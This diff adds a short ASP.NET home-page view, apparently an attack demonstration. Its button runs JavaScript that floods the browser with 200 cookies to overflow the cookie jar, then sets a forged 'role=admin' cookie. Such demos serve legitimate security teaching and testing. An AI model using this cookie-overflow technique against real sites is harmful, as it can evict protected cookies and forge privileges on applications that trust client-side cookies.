@@ -1,0 +1,20 @@
+﻿@{
+    ViewData["Title"] = "Home Page";
+}
+
+<script type="text/javascript">
+
+    function buttonClicked() {
+        var i = 0;
+        // 200 is taken based on tests
+        // tested in Chrome and Firefox
+        while (i < 200) {
+            document.cookie = "text_cookie" + i + "=test";
+            i++;
+        }
+        document.cookie = "role=admin";
+    }
+</script>
+
+
+<input type="button" onclick="buttonClicked()" value="Overflow cookie jar" />
